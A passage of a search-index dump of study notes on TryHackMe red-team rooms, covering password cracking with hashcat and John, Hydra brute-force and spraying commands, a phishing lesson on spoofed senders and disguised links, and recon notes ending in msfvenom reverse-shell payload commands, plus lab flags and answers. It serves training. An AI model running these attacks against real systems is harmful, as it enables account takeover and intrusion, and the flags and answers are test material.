cupp . py ! # Common \\ # User \\ , __ , # Passwords \\ ( oo ) ____ # Profiler ( __ ) )\\ ||--|| * [ Muris Kurgas | j0rgan @remote -exploit . org ] [ Mebus | https :// github . com / Mebus /] Choose the section you want to download : 1 Moby 14 french 27 places 2 afrikaans 15 german 28 polish 3 american 16 hindi 29 random 4 aussie 17 hungarian 30 religion 5 chinese 18 italian 31 russian 6 computer 19 japanese 32 science 7 croatian 20 latin 33 spanish 8 czech 21 literature 34 swahili 9 danish 22 movieTV 35 swedish 10 databases 23 music 36 turkish 11 dictionaries 24 names 37 yiddish 12 dutch 25 net 38 exit program 13 finnish 26 norwegian Files will be downloaded from http :// ftp . funet . fi / pub / unix / security / passwd / crack / dictionaries / repository Tip : After downloading wordlist , you can improve it with -w option > Enter number : Based on your interest, you can choose the wordlist from the list above to aid in generating wordlists for brute-forcing! Finally, CUPP could also provide default usernames and passwords from the Alecto database by using the -a option. CUPP user @thm $ python3 cupp . py -a ___________ cupp . py ! # Common \\ # User \\ , __ , # Passwords \\ ( oo ) ____ # Profiler ( __ ) )\\ ||--|| * [ Muris Kurgas | j0rgan @remote -exploit . org ] [ Mebus | https :// github . com / Mebus /] [+] Checking if alectodb is not present ... [+] Downloading alectodb . csv . gz from https :// github . com / yangbh / Hammer / raw / b0446396e8d67a7d4e53d6666026e078262e5bab / lib / cupp / alectodb . csv . gz ... [+] Exporting to alectodb-usernames . txt and alectodb-passwords . txt [+] Done . Answer the questions below Run the following crunch command:crunch 2 2 01234abcd -o crunch.txt. How many words did crunch generate? Answer 81","title":"CUPP - Common User Passwords Profiler"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#task-5-offline-attacks-dictionary-and-brute-force","text":"This section discusses offline attacks, including dictionary, brute-force, and rule-based attacks.","title":"Task 5: Offline Attacks - Dictionary and Brute-Force"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#dictionary-attack","text":"A dictionary attack is a technique used to guess passwords by using well-known words or phrases. The dictionary attack relies entirely on pre-gathered wordlists that were previously generated or found. It is important to choose or create the best candidate wordlist for your target in order to succeed in this attack. Let's explore performing a dictionary attack using what you've learned in the previous tasks about generating wordlists. We will showcase an offline dictionary attack using hashcat , which is a popular tool to crack hashes. Let's say that we obtain the following hash f806fc5a2a0d5ba2471600758452799c , and want to perform a dictionary attack to crack it. First, we need to know the following at a minimum: 1- What type of hash is this? 2- What wordlist will we be using? Or what type of attack mode could we use? To identify the type of hash, we could a tool such as hashid or hash-identifier . For this example, hash-identifier believed the possible hashing method is MD5. Please note the time to crack a hash will depend on the hardware you're using (CPU and/or GPU). Dictionary attack user @machine $ hashcat -a 0 -m 0 f806fc5a2a0d5ba2471600758452799c / usr / share / wordlists / rockyou . txt hashcat ( v6 . 1 . 1 ) starting ... f806fc5a2a0d5ba2471600758452799c : rockyou Session ..........: hashcat Status ...........: Cracked Hash . Name ........: MD5 Hash . Target ......: f806fc5a2a0d5ba2471600758452799c Time . Started .....: Mon Oct 11 08 : 20 : 50 2021 ( 0 secs ) Time . Estimated ...: Mon Oct 11 08 : 20 : 50 2021 ( 0 secs ) Guess . Base .......: File (/ usr / share / wordlists / rockyou . txt ) Guess . Queue ......: 1 / 1 ( 100 . 00 %) Speed . #1.........: 114.1 kH/s (0.02ms) @ Accel:1024 Loops:1 Thr:1 Vec:8 Recovered ........: 1 / 1 ( 100 . 00 %) Digests Progress .........: 40 / 40 ( 100 . 00 %) Rejected .........: 0 / 40 ( 0 . 00 %) Restore . Point ....: 0 / 40 ( 0 . 00 %) Restore . Sub . #1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates . #1....: 123456 -> 123123 Started : Mon Oct 11 08 : 20 : 49 2021 Stopped : Mon Oct 11 08 : 20 : 52 2021 -a 0 sets the attack mode to a dictionary attack -m 0 sets the hash mode for cracking MD5 hashes; for other types, run hashcat -h for a list of supported hashes. f806fc5a2a0d5ba2471600758452799c this option could be a single hash like our example or a file that contains a hash or multiple hashes. /usr/share/wordlists/rockyou.txt the wordlist/dictionary file for our attack We run hashcat with --show option to show the cracked value if the hash has been cracked: Dictionary attack user @machine $ hashcat -a 0 -m 0 F806FC5A2A0D5BA2471600758452799C / usr / share / wordlists / rockyou . txt - -show f806fc5a2a0d5ba2471600758452799c : rockyou As a result, the cracked value is rockyou .","title":"Dictionary attack"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#brute-force-attack","text":"Brute-forcing is a common attack used by the attacker to gain unauthorized access to a personal account. This method is used to guess the victim's password by sending standard password combinations. The main difference between a dictionary and a brute-force attack is that a dictionary attack uses a wordlist that contains all possible passwords. In contrast, a brute-force attack aims to try all combinations of a character or characters. For example, let's assume that we have a bank account to which we need unauthorized access. We know that the PIN contains 4 digits as a password. We can perform a brute-force attack that starts from 0000 to 9999 to guess the valid PIN based on this knowledge. In other cases, a sequence of numbers or letters can be added to existing words in a list, such as admin0 , admin1 , .. admin9999 . For instance, hashcat has charset options that could be used to generate your own combinations. The charsets can be found in hashcat help options. Brute-Force attack user @machine $ hashcat - -help ? | Charset ===+========= l | abcdefghijklmnopqrstuvwxyz u | ABCDEFGHIJKLMNOPQRSTUVWXYZ d | 0123456789 h | 0123456789abcdef H | 0123456789ABCDEF s | ! \"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ a | ?l?u?d?s b | 0x00 - 0xff The following example shows how we can use hashcat with the brute-force attack mode with a combination of our choice. Brute-Force attack user @machine $ hashcat -a 3 ? d ? d ? d ? d - -stdout 1234 0234 2234 3234 9234 4234 5234 8234 7234 6234 .. .. -a 3 sets the attacking mode as a brute-force attack ?d?d?d?d the ?d tells hashcat to use a digit. In our case, ?d?d?d?d for four digits starting with 0000 and ending at 9999 --stdout print the result to the terminal Now let's apply the same concept to crack the following MD5 hash: 05A5CF06982BA7892ED2A6D38FE832D6 a four-digit PIN number. Brute-Force attack user @machine $ hashcat -a 3 -m 0 05A5CF06982BA7892ED2A6D38FE832D6 ? d ? d ? d ? d 05a5cf06982ba7892ed2a6d38fe832d6 : 2021 Session ..........: hashcat Status ...........: Cracked Hash . Name ........: MD5 Hash . Target ......: 05a5cf06982ba7892ed2a6d38fe832d6 Time . Started .....: Mon Oct 11 10 : 54 : 06 2021 ( 0 secs ) Time . Estimated ...: Mon Oct 11 10 : 54 : 06 2021 ( 0 secs ) Guess . Mask .......: ? d ? d ? d ? d [ 4 ] Guess . Queue ......: 1 / 1 ( 100 . 00 %) Speed . #1.........: 16253.6 kH/s (0.10ms) @ Accel:1024 Loops:10 Thr:1 Vec:8 Recovered ........: 1 / 1 ( 100 . 00 %) Digests Progress .........: 10000 / 10000 ( 100 . 00 %) Rejected .........: 0 / 10000 ( 0 . 00 %) Restore . Point ....: 0 / 1000 ( 0 . 00 %) Restore . Sub . #1...: Salt:0 Amplifier:0-10 Iteration:0-10 Candidates . #1....: 1234 -> 6764 Started : Mon Oct 11 10 : 54 : 05 2021 Stopped : Mon Oct 11 10 : 54 : 08 2021 Answer the questions below Considering the following hash: 8d6e34f987851aa599257d3831a1af040886842f . What is the hash type? Answer sha - 1 Perform a dictionary attack against the following hash: 8d6e34f . What is the cracked value? Use rockyou.txt wordlist. Answer sunshine Perform a brute-force attack against the following MD5 hash: e48e13207341b6bffb7fb1622282247b. What is the cracked value? Note the password is a 4 digit number: [0-9][0-9][0-9][0-9] Answer 1337","title":"Brute-Force attack"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#task-6-offline-attacks-rule-based","text":"","title":"Task 6: Offline Attacks - Rule-Based"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#rule-based-attacks","text":"Rule-Based attacks are also known as hybrid attacks. Rule-Based attacks assume the attacker knows something about the password policy. Rules are applied to create passwords within the guidelines of the given password policy and should, in theory, only generate valid passwords. Using pre-existing wordlists may be useful when generating passwords that fit a policy \u2014 for example, manipulating or 'mangling' a password such as 'password': p@ssword, Pa$$word, Passw0rd, and so on. For this attack, we can expand our wordlist using either hashcat or John the ripper. However, for this attack, let's see how John the ripper works. Usually, John the ripper has a config file that contains rule sets, which is located at /etc/john/john.conf or /opt/john/john.conf depending on your distro or how john was installed. You can read /etc/john/john.conf and look for List.Rules to see all the available rules: Rule-based attack user @machine $ cat / etc / john / john . conf | grep \"List.Rules:\" | cut -d \".\" -f3 | cut -d \":\" -f2 | cut -d \"]\" -f1 | awk NF JumboSingle o1 o2 i1 i2 o1 i1 o2 i2 best64 d3ad0ne dive InsidePro T0XlC rockyou - 30000 specific ShiftToggle Split Single Extra OldOffice Single-Extra Wordlist ShiftToggle Multiword best64 Jumbo KoreLogic T9 We can see that we have many rules that are available for us to use. We will create a wordlist with only one password containing the string tryhackme , to see how we can expand the wordlist. Let's choose one of the rules, the best64 rule, which contains the best 64 built-in John rules, and see what it can do! Rule-based attack user @machine $ john - -wordlist =/ tmp / single-password-list . txt - -rules = best64 - -stdout | wc -l Using default input encoding : UTF - 8 Press 'q' or Ctrl-C to abort , almost any other key for status 76p 0 : 00 : 00 : 00 100 . 00 % ( 2021 - 10 - 11 13 : 42 ) 1266p / s pordpo 76 --wordlist= to specify the wordlist or dictionary file. --rules to specify which rule or rules to use. --stdout to print the output to the terminal. |wc -l to count how many lines John produced. By running the previous command, we expand our password list from 1 to 76 passwords. Now let's check another rule, one of the best rules in John, KoreLogic . KoreLogic uses various built-in and custom rules to generate complex password lists. For more information, please visit this website here . Now let's use this rule and check whether the Tryh@ckm3 is available in our list! Answer the questions below What syntax would you use to create a rule to produce the following: \"S[Word]NN where N is Number and S is a symbol of !@? Answer Az \"[0-9][0-9]\" ^[!@]","title":"Rule-Based attacks"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#task-8-online-password-attacks","text":"Some online password attacks tools: hydra, Medusa , Ncrack , others!","title":"Task 8: Online password attacks"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#hydra","text":"Brute force: hydra -l ftp -P passlist.txt ftp://xxx.xxx.xxx.xxx hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v","title":"Hydra"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#http-login-pages","text":"In this scenario, we will brute-force HTTP login pages . To do that, first, you need to understand what you are brute-forcing. Using hydra, it is important to specify the type of HTTP request, whether GET or POST . Checking hydra options: hydra http-get-form -U , we can see that hydra has the following syntax for the http-get-form option: <url>:<form parameters>:<condition string>[:<optional>[:<optional>] As we mentioned earlier, we need to analyze the HTTP request that we need to send, and that could be done either by using your browser dev tools or using a web proxy such as Burp Suite. hydra user @machine $ hydra -l admin -P 500-worst-passwords . txt 10 . 10 . x . x http-get-form \"/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php\" -f Hydra v8 . 6 ( c ) 2017 by van Hauser / THC - Please do not use in military or secret service organizations , or for illegal purposes . Hydra ( http :// www . thc . org / thc-hydra ) starting at 2021 - 10 - 13 08 : 06 : 22 [DATA] max 16 tasks per 1 server , overall 16 tasks , 500 login tries ( l : 1 / p : 500 ), ~ 32 tries per task [DATA] attacking http-get-form :// 10 . 10 . x . x : 80 // login-get / index . php : username =^ USER ^& password =^ PASS ^: S = logout . php [ 80 ][ http-get-form ] host : 10 . 10 . x . x login : admin password : xxxxxx 1 of 1 target successfully completed , 1 valid password found Hydra ( http :// www . thc . org / thc-hydra ) finished at 2021 - 10 - 13 08 : 06 : 45 Option: -f to stop the brute-forcing attacks after finding a valid username and password Online password attacks Answer the questions below Question 1: Can you guess the FTP credentials without brute-forcing? What is the flag? THM{d0abe799f25738ad739c20301aed357b} Hint: Can login anonymous Perform a brute-forcing attack against the phillips account for the login page at http://MACHINE_IP/login-get using hydra? What is the flag? THM{33c5d4954da881814420f3ba39772644} Perform a rule-based password attack to gain access to the burgess account. Find the flag at the following website: http://MACHINE_IP/login-post/ . What is the flag? THM{f8e3750cc0ccbb863f2706a3b2933227} Note: use the clinic.lst dictionary in generating and expanding the wordlist!","title":"HTTP login pages"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#task-9-password-spray-attack","text":"","title":"Task 9: Password spray attack"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#rdp","text":"See tool: https://github.com/xFreed0m/RDPassSpray Syntax: python3 RDPassSpray.py -u user -p pass -t HOST:PORT","title":"RDP"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#outlook-web-access-owa-portal","text":"Tools: SprayingToolkit (atomizer.py) MailSniper","title":"Outlook web access (OWA) portal"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#smb","text":"Tool: Metasploit (auxiliary/scanner/smb/smb_login) Answer the questions below Use the following username list: Password spraying attack! user @THM :~ # cat usernames-list.txt admin phillips burgess pittman guess Perform a password spraying attack to get access to the SSH://MACHINE_IP server to read /etc/flag . What is the flag? Flag: THM{a97a26e86d09388bbea148f4b870277d}","title":"SMB"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#task-10-summary","text":"This room introduced the basic concepts of different password attacks and how to create custom and targeted password lists. We covered and discussed various topics, including: Default, weak, leaked combined wordlists Password profiling Offline password attacks Online password attacks","title":"Task 10: Summary"},{"location":"tryhackme/red-teaming/init-access/phishing/","tags":["THM-Phishing"],"text":"Phishing \u00b6 Task 1: Brief \u00b6 This room will take you through what phishing is, how it's performed, some valuable tools and why it's an essential part of a Red Team engagement. Now it's time to move to the next task and receive your Intro to Phishing ! I'm ready to learn! No needed answer Task 2: Intro To Phishing Attacks \u00b6 Before you learn what phishing is, you'll need to understand the term social engineering. Social engineering is the psychological manipulation of people into performing or divulging information by exploiting weaknesses in human nature. These \"weaknesses\" can be curiosity, jealously, greed and even kindness and the willingness to help someone. Phishing is a source of social engineering delivered through email to trick someone into either revealing personal information, credentials or even executing malicious code on their computer. These emails will usually appear to come from a trusted source, whether that's a person or a business. They include content that tries to tempt or trick people into downloading software, opening attachments, or following links to a bogus website. A term you'll come across and the type of phishing campaign a red team would participate in is spear-phishing , as with throwing a physical spear; you'd have a target to aim at, the same can be said with spear-phishing in that you're targeting an individual, business or organisation rather than just anybody as mass. This is an effective form of phishing for a red team engagement as they are bespoke to the target it makes them hard to detect by technology such as spam filters, antivirus and firewalls. A red team could be contracted to solely carry out a phishing assessment to see whether a business is vulnerable to this type of attack or can also be part of a broader scale assessment and used to gain access to computer systems or services. Some other methods of phishing through other mediums are smishing which is phishing through SMS messages, and vishing which is performed through phone calls. Example Scenario: The below example scenario shows how an employee of a company could be tricked into revealing their credentials. 1) The attacker locates the physical location of the target business. 2) The attacker then looks for nearby food suppliers and discovers a company called Ultimate Cookies! 3) The Attacker registers the domain name ultimate-cookies.thm 4) The attacker then crafts an email to their target, tempting them with an offer of receiving some free cookies if they sign up to the website. Because the victim has heard of this local company, they are more likely to trust it. 5) The victim then follows the link in the email to the fake website created by the attacker and registers online. To keep things simple, the victim reuses the same password for all their online accounts. 6) The attacker now has the victim's email address and password and can log onto the victim's company email account. The attacker could now have access to private company information and also have somewhere to launch another phishing attack against other employees. Next, you'll learn what goes on in setting up the infrastructure for a red team phishing campaign. What type of psychological manipulation is phishing part of? Social engineering What type of phishing campaign do red teams get involved in? spear-phishing Task 3: Writing Convincing Phishing Emails \u00b6 We have three things to work with regarding phishing emails: the sender's email address, the subject and the content. The Senders Address : Ideally, the sender's address would be from a domain name that spoofs a significant brand, a known contact, or a coworker. See the Choosing A Phishing Domain task below for more information on this. To find what brands or people a victim interacts with, you can employ OSINT (Open Source Intelligence) tactics. For example: Observe their social media account for any brands or friends they talk to. Searching Google for the victim's name and rough location for any reviews the victim may have left about local businesses or brands. Looking at the victim's business website to find suppliers. Looking at LinkedIn to find coworkers of the victim. The Subject : You should set the subject to something quite urgent, worrying, or piques the victim's curiosity, so they do not ignore it and act on it quickly. Examples of this could be: Your account has been compromised. Your package has been dispatched/shipped. Staff payroll information (do not forward!) Your photos have been published. The Content : If impersonating a brand or supplier, it would be pertinent to research their standard email templates and branding (style, logo's images, signoffs etc.) and make your content look the same as theirs, so the victim doesn't expect anything. If impersonating a contact or coworker, it could be beneficial to contact them; first, they may have some branding in their template, have a particular email signature or even something small such as how they refer to themselves, for example, someone might have the name Dorothy and their email is dorothy@company.thm . Still, in their signature, it might say \"Best Regards, Dot\". Learning these somewhat small things can sometimes have quite dramatic psychological effects on the victim and convince them more to open and act on the email. If you've set up a spoof website to harvest data or distribute malware, the links to this should be disguised using the anchor text and changing it either to some text which says \"Click Here\" or changing it to a correct looking link that reflects the business you are spoofing, for example: <a href=\"http://spoofsite.thm\">Click Here</a> <a href=\"http://spoofsite.thm\">https://onlinebank.thm</a> What tactic can be used to find brands or people a victim interacts with? OSINT What should be changed on an HTML anchor tag to disguise a link? anchor text Task 4: Phishing Infrastructure \u00b6 A certain amount of infrastructure will need to be put in place to launch a successful phishing campaign. Domain Name : You'll need to register either an authentic-looking domain name or one that mimics the identity of another domain. See task 5 for details on how to create the perfect domain name. SSL/TLS Certificates : Creating SSL/TLS certificates for your chosen domain name will add an extra layer of authenticity to the attack. Email Server/Account : You'll need to either set up an email server or register with an SMTP email provider. DNS Records : Setting up DNS Records such as SPF, DKIM, DMARC will improve the deliverability of your emails and make sure they're getting into the inbox rather than the spam folder. Web Server : You'll need to set up webservers or purchase web hosting from a company to host your phishing websites. Adding SSL/TLS to the websites will give them an extra layer of authenticity. Analytics : When a phishing campaign is part of a red team engagement, keeping analytics information is more important. You'll need something to keep track of the emails that have been sent, opened or clicked. You'll also need to combine it with information from your phishing websites for which users have supplied personal information or downloaded software. Automation And Useful Software : Some of the above infrastructures can be quickly automated by using the below tools. GoPhish - (Open-Source Phishing Framework) - getgophish.com GoPhish is a web-based framework to make setting up phishing campaigns more straightforward. GoPhish allows you to store your SMTP server settings for sending emails, has a web-based tool for creating email templates using a simple WYSIWYG (What You See Is What You Get) editor. You can also schedule when emails are sent and have an analytics dashboard that shows how many emails have been sent, opened or clicked. The Next task will talk you through how to launch a phishing campaign using this software. SET - (Social Engineering Toolkit) - trustedsec.com The Social Engineering Toolkit contains a multitude of tools, but some of the important ones for phishing are the ability to create spear-phishing attacks and deploy fake versions of common websites to trick victims into entering their credentials. Answer the questions below --- What part of a red team infrastructure can make a website look more authentic? SSL/TLS Certificates","title":"Phishing"},{"location":"tryhackme/red-teaming/init-access/phishing/#phishing","text":"","title":"Phishing"},{"location":"tryhackme/red-teaming/init-access/phishing/#task-1-brief","text":"This room will take you through what phishing is, how it's performed, some valuable tools and why it's an essential part of a Red Team engagement. Now it's time to move to the next task and receive your Intro to Phishing ! I'm ready to learn! No needed answer","title":"Task 1: Brief"},{"location":"tryhackme/red-teaming/init-access/phishing/#task-2-intro-to-phishing-attacks","text":"Before you learn what phishing is, you'll need to understand the term social engineering. Social engineering is the psychological manipulation of people into performing or divulging information by exploiting weaknesses in human nature. These \"weaknesses\" can be curiosity, jealously, greed and even kindness and the willingness to help someone. Phishing is a source of social engineering delivered through email to trick someone into either revealing personal information, credentials or even executing malicious code on their computer. These emails will usually appear to come from a trusted source, whether that's a person or a business. They include content that tries to tempt or trick people into downloading software, opening attachments, or following links to a bogus website. A term you'll come across and the type of phishing campaign a red team would participate in is spear-phishing , as with throwing a physical spear; you'd have a target to aim at, the same can be said with spear-phishing in that you're targeting an individual, business or organisation rather than just anybody as mass. This is an effective form of phishing for a red team engagement as they are bespoke to the target it makes them hard to detect by technology such as spam filters, antivirus and firewalls. A red team could be contracted to solely carry out a phishing assessment to see whether a business is vulnerable to this type of attack or can also be part of a broader scale assessment and used to gain access to computer systems or services. Some other methods of phishing through other mediums are smishing which is phishing through SMS messages, and vishing which is performed through phone calls. Example Scenario: The below example scenario shows how an employee of a company could be tricked into revealing their credentials. 1) The attacker locates the physical location of the target business. 2) The attacker then looks for nearby food suppliers and discovers a company called Ultimate Cookies! 3) The Attacker registers the domain name ultimate-cookies.thm 4) The attacker then crafts an email to their target, tempting them with an offer of receiving some free cookies if they sign up to the website. Because the victim has heard of this local company, they are more likely to trust it. 5) The victim then follows the link in the email to the fake website created by the attacker and registers online. To keep things simple, the victim reuses the same password for all their online accounts. 6) The attacker now has the victim's email address and password and can log onto the victim's company email account. The attacker could now have access to private company information and also have somewhere to launch another phishing attack against other employees. Next, you'll learn what goes on in setting up the infrastructure for a red team phishing campaign. What type of psychological manipulation is phishing part of? Social engineering What type of phishing campaign do red teams get involved in? spear-phishing","title":"Task 2: Intro To Phishing Attacks"},{"location":"tryhackme/red-teaming/init-access/phishing/#task-3-writing-convincing-phishing-emails","text":"We have three things to work with regarding phishing emails: the sender's email address, the subject and the content. The Senders Address : Ideally, the sender's address would be from a domain name that spoofs a significant brand, a known contact, or a coworker. See the Choosing A Phishing Domain task below for more information on this. To find what brands or people a victim interacts with, you can employ OSINT (Open Source Intelligence) tactics. For example: Observe their social media account for any brands or friends they talk to. Searching Google for the victim's name and rough location for any reviews the victim may have left about local businesses or brands. Looking at the victim's business website to find suppliers. Looking at LinkedIn to find coworkers of the victim. The Subject : You should set the subject to something quite urgent, worrying, or piques the victim's curiosity, so they do not ignore it and act on it quickly. Examples of this could be: Your account has been compromised. Your package has been dispatched/shipped. Staff payroll information (do not forward!) Your photos have been published. The Content : If impersonating a brand or supplier, it would be pertinent to research their standard email templates and branding (style, logo's images, signoffs etc.) and make your content look the same as theirs, so the victim doesn't expect anything. If impersonating a contact or coworker, it could be beneficial to contact them; first, they may have some branding in their template, have a particular email signature or even something small such as how they refer to themselves, for example, someone might have the name Dorothy and their email is dorothy@company.thm . Still, in their signature, it might say \"Best Regards, Dot\". Learning these somewhat small things can sometimes have quite dramatic psychological effects on the victim and convince them more to open and act on the email. If you've set up a spoof website to harvest data or distribute malware, the links to this should be disguised using the anchor text and changing it either to some text which says \"Click Here\" or changing it to a correct looking link that reflects the business you are spoofing, for example: <a href=\"http://spoofsite.thm\">Click Here</a> <a href=\"http://spoofsite.thm\">https://onlinebank.thm</a> What tactic can be used to find brands or people a victim interacts with? OSINT What should be changed on an HTML anchor tag to disguise a link? anchor text","title":"Task 3: Writing Convincing Phishing Emails"},{"location":"tryhackme/red-teaming/init-access/phishing/#task-4-phishing-infrastructure","text":"A certain amount of infrastructure will need to be put in place to launch a successful phishing campaign. Domain Name : You'll need to register either an authentic-looking domain name or one that mimics the identity of another domain. See task 5 for details on how to create the perfect domain name. SSL/TLS Certificates : Creating SSL/TLS certificates for your chosen domain name will add an extra layer of authenticity to the attack. Email Server/Account : You'll need to either set up an email server or register with an SMTP email provider. DNS Records : Setting up DNS Records such as SPF, DKIM, DMARC will improve the deliverability of your emails and make sure they're getting into the inbox rather than the spam folder. Web Server : You'll need to set up webservers or purchase web hosting from a company to host your phishing websites. Adding SSL/TLS to the websites will give them an extra layer of authenticity. Analytics : When a phishing campaign is part of a red team engagement, keeping analytics information is more important. You'll need something to keep track of the emails that have been sent, opened or clicked. You'll also need to combine it with information from your phishing websites for which users have supplied personal information or downloaded software. Automation And Useful Software : Some of the above infrastructures can be quickly automated by using the below tools. GoPhish - (Open-Source Phishing Framework) - getgophish.com GoPhish is a web-based framework to make setting up phishing campaigns more straightforward. GoPhish allows you to store your SMTP server settings for sending emails, has a web-based tool for creating email templates using a simple WYSIWYG (What You See Is What You Get) editor. You can also schedule when emails are sent and have an analytics dashboard that shows how many emails have been sent, opened or clicked. The Next task will talk you through how to launch a phishing campaign using this software. SET - (Social Engineering Toolkit) - trustedsec.com The Social Engineering Toolkit contains a multitude of tools, but some of the important ones for phishing are the ability to create spear-phishing attacks and deploy fake versions of common websites to trick victims into entering their credentials. Answer the questions below --- What part of a red team infrastructure can make a website look more authentic? SSL/TLS Certificates","title":"Task 4: Phishing Infrastructure"},{"location":"tryhackme/red-teaming/init-access/red-team-reconnaissance/","tags":["THM-Init Access"],"text":"Init Access \u00b6 C\u00f3 m\u1ed9t c\u00e2u n\u00f3i r\u1ea5t hay \"Bi\u1ebft ng\u01b0\u1eddi bi\u1ebft ta, tr\u0103m tr\u1eadn tr\u0103m th\u1eafng\". \u0110\u1ea7u ti\u00ean khi ta b\u01b0\u1edbc v\u00e0o giai \u0111o\u1ea1n t\u1ea5n c\u00f4ng m\u1ed9t th\u1ee9 g\u00ec \u0111\u00f3 th\u00ec vi\u1ec7c hi\u1ec3u v\u1ec1 n\u00f3 th\u1ef1c s\u1ef1 c\u1ea7n thi\u1ebft. B\u1ea1n c\u00f3 th\u1ec3 tham kh\u1ea3o m\u1ed9t v\u00e0i k\u0129 thu\u1eadt do th\u00e1m t\u1eeb v\u1ecb tr\u00ed c\u1ee7a Redteam nh\u01b0 sau: Types of reconnaissance activities WHOIS and DNS-based reconnaissance Advanced searching Searching by image Google Hacking Specialized search engines Recon-ng Maltego Types of reconnaissance activities (c\u00e1c lo\u1ea1i trinh s\u00e1t) \u00b6 Trinh s\u00e1t c\u00f3 th\u1ec3 chia l\u00e0m 2 lo\u1ea1i: Trinh s\u00e1t b\u1ecb \u0111\u1ed9ng: C\u00f3 th\u1ec3 th\u1ef1c hi\u1ec7n b\u1eb1ng vi\u1ec7c quan s\u00e1t nh\u1eefng g\u00ec c\u00f3 s\u1eb5n \u1edf m\u1ee5c ti\u00eau ho\u1eb7c \u1edf b\u00ean th\u1ee9 ba cung c\u1ea5p (d\u00f9ng c\u00e1c k\u0129 thu\u1eadt nh\u01b0 OSINT \u0111\u1ec3 thu th\u1eadp th\u00f4ng tin, ... whois, nslookup, dig, shodan.io, DNSDumpster,...) Trinh s\u00e1t ch\u1ee7 \u0111\u1ed9ng: C\u1ea7n ch\u1ee7 \u0111\u1ed9ng, t\u01b0\u01a1ng t\u00e1c v\u1edbi m\u1ee5c ti\u00eau nh\u1eb1m xem ph\u1ea3n \u1ee9ng c\u1ee7a n\u00f3 (c\u00e1c c\u00f4ng c\u1ee5 \u0111\u01b0\u1ee3c d\u00f9ng nh\u01b0 netcat, ping, traceroute, telnet, ...). Trong trinh s\u00e1t ch\u1ee7 \u0111\u1ed9ng, c\u00f3 th\u1ec3 chia l\u00e0m 2 nh\u00e1nh ti\u1ebfp c\u1eadn sau: Trinh s\u00e1t t\u1eeb b\u00ean ngo\u00e0i: \u0110\u01b0\u1ee3c ti\u1ebfn h\u00e0nh trinh s\u00e1t t\u1eeb b\u00ean ngo\u00e0i m\u1ea1ng n\u1ed9i b\u1ed9 c\u1ee7a m\u1ee5c ti\u00eau. Trinh s\u00e1t t\u1eeb b\u00ean trong: \u0110\u01b0\u1ee3c ti\u1ebfn h\u00e0nh trinh s\u00e1t t\u1eeb b\u00ean trong m\u1ea1ng n\u1ed9i b\u1ed9 c\u1ee7a m\u1ee5c ti\u00eau Recon-ng l\u00e0 m\u1ed9t framework gi\u00fap t\u1ef1 \u0111\u1ed9ng h\u00f3a c\u00f4ng vi\u1ec7c OSINT. N\u00f3 s\u1eed d\u1ee5ng c\u00e1c m\u00f4-\u0111un t\u1eeb nhi\u1ec1u t\u00e1c gi\u1ea3 kh\u00e1c nhau v\u00e0 cung c\u1ea5p v\u00f4 s\u1ed1 ch\u1ee9c n\u0103ng. M\u1ed9t s\u1ed1 m\u00f4-\u0111un y\u00eau c\u1ea7u c\u00e1c ph\u00edm \u0111\u1ec3 ho\u1ea1t \u0111\u1ed9ng; kh\u00f3a cho ph\u00e9p m\u00f4-\u0111un truy v\u1ea5n API tr\u1ef1c tuy\u1ebfn c\u00f3 li\u00ean quan. Trong nhi\u1ec7m v\u1ee5 n\u00e0y, ch\u00fang t\u00f4i s\u1ebd minh h\u1ecda b\u1eb1ng c\u00e1ch s\u1eed d\u1ee5ng Recon-ng trong thi\u1ebft b\u1ecb \u0111\u1ea7u cu\u1ed1i. marketplace search KEYWORD\u0111\u1ec3 t\u00ecm ki\u1ebfm c\u00e1c m\u00f4-\u0111un c\u00f3 s\u1eb5n v\u1edbi t\u1eeb kh\u00f3a . marketplace info MODULE\u0111\u1ec3 cung c\u1ea5p th\u00f4ng tin v\u1ec1 m\u00f4-\u0111un \u0111\u01b0\u1ee3c \u0111\u1ec1 c\u1eadp. marketplace install MODULE\u0111\u1ec3 c\u00e0i \u0111\u1eb7t m\u00f4-\u0111un \u0111\u01b0\u1ee3c ch\u1ec9 \u0111\u1ecbnh v\u00e0o Recon-ng. marketplace remove MODULE\u0111\u1ec3 g\u1ee1 c\u00e0i \u0111\u1eb7t m\u00f4-\u0111un \u0111\u01b0\u1ee3c ch\u1ec9 \u0111\u1ecbnh. tra ip ng\u01b0\u1ee3c: https://viewdns.info/ https://search.censys.io/ https://www.google.com/advanced_search reverse shell for window: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta reverse shell for window with vba: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.18.80.57 LPORT=443 -f vba","title":"Init Access"},{"location":"tryhackme/red-teaming/init-access/red-team-reconnaissance/#init-access","text":"C\u00f3 m\u1ed9t c\u00e2u n\u00f3i r\u1ea5t hay \"Bi\u1ebft ng\u01b0\u1eddi bi\u1ebft ta, tr\u0103m tr\u1eadn tr\u0103m th\u1eafng\". \u0110\u1ea7u ti\u00ean khi ta b\u01b0\u1edbc v\u00e0o giai \u0111o\u1ea1n t\u1ea5n c\u00f4ng m\u1ed9t th\u1ee9 g\u00ec \u0111\u00f3 th\u00ec vi\u1ec7c hi\u1ec3u v\u1ec1 n\u00f3 th\u1ef1c s\u1ef1 c\u1ea7n thi\u1ebft. B\u1ea1n c\u00f3 th\u1ec3 tham kh\u1ea3o m\u1ed9t v\u00e0i k\u0129 thu\u1eadt do th\u00e1m t\u1eeb v\u1ecb tr\u00ed c\u1ee7a Redteam nh\u01b0 sau: Types of reconnaissance activities WHOIS and DNS-based reconnaissance Advanced searching Searching by image Google Hacking Specialized search engines Recon-ng Maltego","title":"Init 